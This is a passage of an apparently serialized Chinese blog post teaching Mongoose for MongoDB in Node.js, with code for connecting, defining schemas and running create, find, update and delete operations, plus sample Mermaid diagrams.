class=\"string\">'open'</span>, () =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'成功连接到 mongoDB 数据库'</span>)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">mongoose.connection.once(<span class=\"string\">'close'</span>, () =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'断开 mongoDB 数据库'</span>)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 3.连接数据库</span></span><br><span class=\"line\"><span class=\"comment\">// mongoose.connect('mongodb://数据库ip地址:端口号(默认：27017)/数据库名')</span></span><br><span class=\"line\">mongoose.connect(</span><br><span class=\"line\">  <span class=\"string\">'mongodb://127.0.0.1/test'</span>,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    useNewUrlParser: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    useUnifiedTopology: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  (err, db) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'连接数据库成功'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// mongoose 断开连接</span></span><br><span class=\"line\"><span class=\"comment\">// mongoose.disconnect()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义一个schema</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> Schema = mongoose.Schema</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// model模型</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> stuSchema = <span class=\"keyword\">new</span> Schema(&#123;</span><br><span class=\"line\">  name: <span class=\"built_in\">String</span>,</span><br><span class=\"line\">  age: <span class=\"built_in\">Number</span>,</span><br><span class=\"line\">  gender: &#123;</span><br><span class=\"line\">    type: <span class=\"built_in\">String</span>,</span><br><span class=\"line\">    <span class=\"keyword\">default</span>: <span class=\"string\">'female'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  address: <span class=\"built_in\">String</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 创建一个 model -&gt; collection # mogoose.model(modelName, schema)</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> StuModel = mongoose.model(<span class=\"string\">'stus'</span>, stuSchema)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 测试：创建一个文档插入到数据库中</span></span><br><span class=\"line\"><span class=\"comment\">// StuModel.create(&#123;</span></span><br><span class=\"line\"><span class=\"comment\">//   name: 'houfei',</span></span><br><span class=\"line\"><span class=\"comment\">//   age: 25,</span></span><br><span class=\"line\"><span class=\"comment\">//   gender: 'male',</span></span><br><span class=\"line\"><span class=\"comment\">//   address: '河北'</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;, err =&gt; &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//   if(!err) console.log('插入成功')</span></span><br><span class=\"line\"><span class=\"comment\">//   else console.log('插入失败')</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;)</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Model的API\"><a href=\"#Model的API\" class=\"headerlink\" title=\"Model的API\"></a>Model的API</h3><p><strong>document 是 model 的实例</strong></p>\n<h4 id=\"插入\"><a href=\"#插入\" class=\"headerlink\" title=\"插入\"></a>插入</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// StuModel.create(object1, object2, ..., (err, object1, object2, ...) = &gt; &#123; &#125;)</span></span><br><span class=\"line\"><span class=\"comment\">// StuModel.create(array, (err, array) = &gt; &#123; &#125;)</span></span><br><span class=\"line\">StuModel.create(</span><br><span class=\"line\">  [&#123;</span><br><span class=\"line\">    name: <span class=\"string\">'liming'</span>,</span><br><span class=\"line\">    age: <span class=\"number\">23</span>,</span><br><span class=\"line\">    gender: <span class=\"string\">'male'</span>,</span><br><span class=\"line\">    address: <span class=\"string\">'安徽'</span></span><br><span class=\"line\">  &#125;], (err, array) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(array)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'插入成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'插入失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"查询数据\"><a href=\"#查询数据\" class=\"headerlink\" title=\"查询数据\"></a>查询数据</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * filter 查询条件</span></span><br><span class=\"line\"><span class=\"comment\"> * projection 投影</span></span><br><span class=\"line\"><span class=\"comment\"> * options 查询选项 skip limit</span></span><br><span class=\"line\"><span class=\"comment\"> * callback 回调函数</span></span><br><span class=\"line\"><span class=\"comment\">  Model.find(filter, [projection], [options], [callback])</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findById()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findByIdAndDelete()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findByIdAndRemove()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findByIdAndUpdate()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findOne()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findOneAndDelete()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findOneAndRemove()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findOneAndReplace()</span></span><br><span class=\"line\"><span class=\"comment\">  Model.findOneAndUpdate()</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在 StuModel 查询 name 为 jack，并且 age 大于 22的所有array文档，并且只显示 name age 属性，不显示 _id 属性， array并且要跳过 skip 第一条数据</span></span><br><span class=\"line\">StuModel.find(&#123; <span class=\"attr\">name</span>: <span class=\"string\">'jack'</span>, <span class=\"attr\">age</span>: &#123; <span class=\"attr\">$gte</span>: <span class=\"number\">22</span> &#125; &#125;, <span class=\"string\">'name age -_id'</span>, &#123; <span class=\"attr\">skip</span>: <span class=\"number\">1</span> &#125;, (err, docs) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(docs)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'查询成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'查询失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StuModel.findOne(&#123; <span class=\"attr\">age</span>: &#123; <span class=\"attr\">$gte</span>: <span class=\"number\">19</span> &#125; &#125;, <span class=\"string\">'name age -_id'</span>, &#123;&#125;, (err, doc) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(doc)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'查询成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'查询失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StuModel.findById(<span class=\"string\">'5ee9f47cf67607ea5eda6894'</span>, <span class=\"string\">'name'</span>, &#123; &#125;, (err, doc) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(doc <span class=\"keyword\">instanceof</span> StuModel)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'查询成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'查询失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"更新数据\"><a href=\"#更新数据\" class=\"headerlink\" title=\"更新数据\"></a>更新数据</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">Model.updateMany(filter, doc, [options], [callback])</span></span><br><span class=\"line\"><span class=\"comment\">Model.updateOne(filter, doc, [options], [callback])</span></span><br><span class=\"line\"><span class=\"comment\">Model.replaceOne(filter, doc, [options], [callback])</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">StuModel.updateOne(&#123;<span class=\"attr\">name</span>: <span class=\"string\">\"houfei\"</span>&#125;, &#123;</span><br><span class=\"line\">  $<span class=\"keyword\">set</span>: &#123;</span><br><span class=\"line\">    age: <span class=\"number\">1</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;, &#123;<span class=\"attr\">multi</span>: <span class=\"literal\">false</span>&#125;, (err, status) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(status)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'修改成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'修改失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"删除数据\"><a href=\"#删除数据\" class=\"headerlink\" title=\"删除数据\"></a>删除数据</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">Model.deleteMany(conditions, [options], [callback])</span></span><br><span class=\"line\"><span class=\"comment\">Model.deleteOne(conditions, [options], [callback])</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">StuModel.deleteOne(&#123;<span class=\"attr\">name</span>: <span class=\"string\">\"houfei\"</span>&#125;, (err, state) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(state)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'删除成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'删除失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Document的API\"><a href=\"#Document的API\" class=\"headerlink\" title=\"Document的API\"></a>Document的API</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 创建 Document 对象</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> stu = <span class=\"keyword\">new</span> StuModel(&#123;</span><br><span class=\"line\">  name: <span class=\"string\">'李白'</span>,</span><br><span class=\"line\">  age: <span class=\"number\">30</span>,</span><br><span class=\"line\">  gender: <span class=\"string\">'female'</span>,</span><br><span class=\"line\">  address: <span class=\"string\">'四川'</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"doc-save\"><a href=\"#doc-save\" class=\"headerlink\" title=\"doc.save()\"></a><a href=\"https://mongoosejs.com/docs/api/document.html#document_Document-save\" target=\"_blank\" rel=\"noopener\">doc.save()</a></h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 保存方法 save</span></span><br><span class=\"line\">stu.save(<span class=\"function\">(<span class=\"params\">err, state</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(state)</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'添加成功'</span>)</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'添加失败'</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"doc-update\"><a href=\"#doc-update\" class=\"headerlink\" title=\"doc.update()\"></a><a href=\"https://mongoosejs.com/docs/api/document.html#document_Document-update\" target=\"_blank\" rel=\"noopener\">doc.update()</a></h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StuModel.findOne(&#123;&#125;, (error, doc) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * Document.prototype.update(doc, options, callback)</span></span><br><span class=\"line\"><span class=\"comment\">   * doc «Object»</span></span><br><span class=\"line\"><span class=\"comment\">   * options «Object»</span></span><br><span class=\"line\"><span class=\"comment\">   * callback «Function»</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  doc.update(&#123;<span class=\"attr\">$set</span>: &#123;</span><br><span class=\"line\">    age: <span class=\"number\">1</span></span><br><span class=\"line\">  &#125;&#125;,(err, status) =&gt; &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(status)</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!err) <span class=\"built_in\">console</span>.log(<span class=\"string\">'修改成功'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">'修改失败'</span>)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"doc-get-set-id\"><a href=\"#doc-get-set-id\" class=\"headerlink\" title=\"doc.get()|.set()|id\"></a><a href=\"https://mongoosejs.com/docs/api/document.html#document_Document-get\" target=\"_blank\" rel=\"noopener\">doc.get()|.set()|id</a></h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StuModel.findOne(&#123;&#125;, (error, doc) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(doc.id)</span><br><span class=\"line\">  doc.get(<span class=\"string\">'address'</span>, <span class=\"built_in\">String</span>)</span><br><span class=\"line\">  doc.set(<span class=\"string\">'age'</span>, <span class=\"number\">99</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"doc-toJSON-toObject\"><a href=\"#doc-toJSON-toObject\" class=\"headerlink\" title=\"doc.toJSON()|toObject\"></a><a href=\"https://mongoosejs.com/docs/api/document.html#document_Document-toJSON\" target=\"_blank\" rel=\"noopener\">doc.toJSON()|toObject</a></h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StuModel.findOne(&#123;&#125;, (error, doc) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> a = doc.toJSON()</span><br><span class=\"line\">  <span class=\"keyword\">let</span> b = doc.toObject()</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(a, b)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Mongoose模块化\"><a href=\"#Mongoose模块化\" class=\"headerlink\" title=\"Mongoose模块化\"></a>Mongoose模块化</h3><p><a href=\"https://www.bilibili.com/video/BV1Lb411V7rv?p=19\" target=\"_blank\" rel=\"noopener\"> 视频地址</a></p>\n<h3 id=\"拓展甘特图\"><a href=\"#拓展甘特图\" class=\"headerlink\" title=\"拓展甘特图\"></a>拓展甘特图</h3><p><a href=\"https://mermaid-js.github.io/mermaid/#/README\" target=\"_blank\" rel=\"noopener\">GitHub guide</a></p>\n<h4 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a><a href=\"https://mermaid-js.github.io/mermaid/#/README?id=flowchart\" target=\"_blank\" rel=\"noopener\">流程图</a></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph TD;</span><br><span class=\"line\">    A--&gt;B;</span><br><span class=\"line\">    A--&gt;C;</span><br><span class=\"line\">    B--&gt;D;</span><br><span class=\"line\">    C--&gt;D;</span><br></pre></td></tr></table></figure>\n<h4 id=\"顺序图\"><a href=\"#顺序图\" class=\"headerlink\" title=\"顺序图\"></a><a href=\"https://mermaid-js.github.io/mermaid/#/README?id=sequence-diagram\" target=\"_blank\" rel=\"noopener\">顺序图</a></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sequenceDiagram</span><br><span class=\"line\">    participant Alice</span><br><span class=\"line\">    participant Bob</span><br><span class=\"line\">    Alice-&gt;&gt;John: Hello John, how are you?</span><br><span class=\"line\">    loop Healthcheck</span><br><span class=\"line\">        John-&gt;&gt;John: Fight against hypochondria</span><br><span class=\"line\">    end</span><br><span class=\"line\">    Note right of John: Rational thoughts &lt;br/&gt;prevail!</span><br><span class=\"line\">    John--&gt;&gt;Alice: Great!</span><br><span class=\"line\">    John-&gt;&gt;Bob: How about you?</span><br><span class=\"line\">    Bob--&gt;&gt;John: Jolly good!</span><br></pre></td></tr></table></figure>\n<h4 id=\"甘特图\"><a href=\"#甘特图\" class=\"headerlink\" title=\"甘特图\"></a><a href=\"https://mermaid-js.github.io/mermaid/#/README?id=gantt-diagram\" target=\"_blank\" rel=\"noopener\">甘特图</a></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gantt</span><br><span class=\"line\">dateFormat  YYYY-MM-DD</span><br><span class=\"line\">title Adding GANTT diagram to mermaid</span><br><span class=\"line\">excludes weekdays 2014-01-10</span><br><span class=\"line\"></span><br><span class=\"line\">section A section</span><br><span class=\"line\">Completed task            :done,    des1, 2014-01-06,2014-01-08</span><br><span class=\"line\">Active task               :active,  des2, 2014-01-09, 3d</span><br><span class=\"line\">Future task               :         des3, after des2, 5d</span><br><span class=\"line\">Future task2               :         des4, after des3, 5d</span><br></pre></td></tr></table></figure>\n<h4 id=\"其他一\"><a href=\"#其他一\" class=\"headerlink\" title=\"其他一\"></a>其他一</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">    A(开始) --&gt;B(起床)</span><br><span class=\"line\">    B --天气不好--- C&gt;干活]</span><br><span class=\"line\">    C ==&gt; D&#123;休息时间到了&#125;</span><br><span class=\"line\">    D -.yes.-&gt; E((休息))</span><br><span class=\"line\">    D -.no.-&gt; C</span><br><span class=\"line\">    E --&gt; F(吃饭)</span><br></pre></td></tr></table></figure>\n<h4 id=\"其他二\"><a href=\"#其他二\" class=\"headerlink\" title=\"其他二\"></a>其他二</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sequenceDiagram</span><br><span class=\"line\">对象A-&gt;&gt;对象B:中午吃什么？</span><br><span class=\"line\">对象B-&gt;&gt;对象A: 随便</span><br><span class=\"line\">loop 思考</span><br><span class=\"line\">    对象A-&gt;对象A: 努力搜索</span><br><span class=\"line\">end</span><br><span class=\"line\">对象A--&gt;&gt;对象B: 火锅？</span><br><span class=\"line\">对象B-&gt;&gt;对象A: 可以</span><br><span class=\"line\">Note left of 对象A: 我是一个对象A</span><br><span class=\"line\">Note right of 对象B: 我是一个对象B</span><br><span class=\"line\">participant 对象C</span><br><span class=\"line\">Note over 对象C: 我自己说了算</span><br></pre></td></tr></table></figure>\n<h4 id=\"其他三\"><a href=\"#其他三\" class=\"headerlink\" title=\"其他三\"></a>其他三</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gantt</span><br><span class=\"line\">        dateFormat  YYYY-MM-DD</span><br><span class=\"line\">        title 软件开发甘特图</span><br><span class=\"line\">        section 设计</span><br><span class=\"line\">        需求:done,des1, 2019-01-06,2019-01-08</span><br><span class=\"line\">        原型:active,des2, 2019-01-09, 3d</span><br><span class=\"line\">        UI设计:des3, after des2, 5d</span><br><span class=\"line\">        未来任务:des4, after des3, 5d</span><br><span class=\"line\"></span><br><span class=\"line\">        section 开发</span><br><span class=\"line\">        学习准备理解需求:crit, done, 2019-01-06,24h</span><br><span class=\"line\">        设计框架:crit, done, after des2, 2d</span><br><span class=\"line\">        开发:crit, active, 3d</span><br><span class=\"line\">        未来任务:crit, 5d</span><br><span class=\"line\">        休息时间:2d</span><br><span class=\"line\"></span><br><span class=\"line\">        section 测试</span><br><span class=\"line\">        功能测试:active, a1, after des3, 3d</span><br><span class=\"line\">        压力测试:after a1, 20h</span><br><span class=\"line\">        测试报告: 48h</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>Mongoose 是基于nodejs，使用javascript编程，连接mongodb数据库的软件包，使mongodb的文档数据模型变的优雅起来，方便对mongodb文档型数据库的连接和增删改查等常规数据操作。</p>\n<p>mongoose是当前使用mean（mongodb express angularjs nodejs）全栈开发必用的连接数据库软件包。</p>\n<p>参考资料：</p>\n<p><a href=\"https://mlab.com/\" target=\"_blank\" rel=\"noopener\">在线数据库</a></p>\n<p><a href=\"http://www.mongoosejs.net/docs/guide.html\" target=\"_blank\" rel=\"noopener\">mongoose guide</a></p>\n<h2 id=\"后台与数据库交互\"><a href=\"#后台与数据库交互\" class=\"headerlink\" title=\"后台与数据库交互\"></a>后台与数据库交互</h2><ul>\n<li>使用数据库的原生语言（例如 SQL）</li>\n<li>使用对象数据模型（Object Data Model，简称 ODM）或对象关系模型（Object Relational Model，简称 ORM）。 ODM / ORM 能将网站中的数据表示为 JavaScript 对象，然后将它们映射到底层数据库。一些 ORM 只适用某些特定数据库，还有一些是普遍适用的。</li>\n</ul>\n<p>使用 SQL 或其它受到支持的查询语言才能达到最佳性能。</p>\n<p>ODM 通常慢一些，因为在对象和数据库格式之间存在一层用于映射的翻译代码，使它不一定会选用最高性能的数据库查询（尤其是普遍使用级别的 ODM，它必须在各类数据库功能方面做出更大的折衷）。</p>\n<p>使用 ORM 的好处是：程序员可以继续用 JavaScript 对象的思维而不用转向数据库语义的思维。 在（同一个或不同网站）使用不同数据库时尤为明显。使用 ORM 还可以更方便地对数据进行验证和检查。</p>\n<h2 id=\"Mongoose\"><a href=\"#Mongoose\" class=\"headerlink\" title=\"Mongoose\"></a>Mongoose</h2><ul>\n<li>Mongoose是在node.js异步环境下对mongodb进行便捷操作的对象模型工具</li>\n</ul>\n<p>Mongoose 的优点：</p>\n<ul>\n<li>可以为文档创建一个模式结构（Schema）</li>\n<li>可以对模型中的对象/文档进行验证</li>\n<li>数据可以通过类型转换为对象模型</li>\n<li>可以使用中间件来应用业务逻辑挂钩</li>\n<li>比 Node 原生的 MongoDB 驱动更容易<br>Mongoose 是最受欢迎的 ODM，选用 MongoDB 数据库时，它是一个合理的选择。</li>\n</ul>\n<p>新的对象：</p>\n<ul>\n<li>Schema（模式对象）<br>— Schema对象定义约束了数据库中的文档结构</li>\n<li>Model<br>— Model对象作为集合中的所有文件的表示，相当于MondoDB数据库中的集合collection</li>\n<li>Document<br>— Document 表示集合中的具体文档，相当于集合中的一个具体的文档</li>\n</ul>\n<h3 id=\"mongoose-连接数据库\"><a href=\"#mongoose-连接数据库\" class=\"headerlink\" title=\"mongoose 连接数据库\"></a>mongoose 连接数据库</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span 